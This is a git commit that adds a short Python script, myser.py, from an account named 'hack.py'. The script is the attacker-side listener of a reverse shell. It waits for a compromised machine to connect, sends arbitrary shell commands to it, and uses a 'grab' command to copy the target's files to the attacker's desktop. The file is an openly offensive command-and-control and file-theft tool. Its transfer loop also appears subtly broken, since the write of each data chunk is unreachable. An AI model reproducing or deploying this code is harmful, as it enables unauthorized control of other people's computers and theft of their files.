515882e12819fb09487f367d6868483a4a8c3fa2
hack.py <53619232+hack-py@users.noreply.github.com>
2019-08-04 12:25:31 -0400

    Add files via upload

---
+++ myser.py
@@ -0,0 +1,44 @@
+import os
+import socket
+def transfer(conn,command): #function (connecting) grab part
+	conn.send(command.encode())
+	grab,path=command.split('=')
+	f=open("/root/Desktop/"+path,"wb")  #path  assigned  to our system for grabing targets file
+	while True:
+		bits=conn.recv(1024)
+		if bits.endswith ("END".encode()):
+			f.write(bits[:-3])
+			f.close()
+			print("[+] transfer completed")
+			break
+		if '404'.encode() in bits:
+			print ('[-] 404')
+			break
+			f.write(bits)
+def connecting():
+	ip=input("enter the ip:")# your ip
+	port=int(input("enter the port:")) #port eg 8080
+	s=socket.socket()
+	s.bind((ip,port))
+	s.listen(1)
+	print("[+] listening for incoming connections")
+	conn,addr=s.accept()
+	print("[+] connection established",addr)
+	while True:
+		command=input("shell>>")
+		if 'terminate' in command:
+			conn.send('terminate'.encode())
+			break
+		elif 'grab' in command:
+			transfer(conn,command)
+		else:
+			conn.send(command.encode())
+			print(conn.recv(1024))
+def main():
+	connecting()
+main()
+
+
+
+
+		
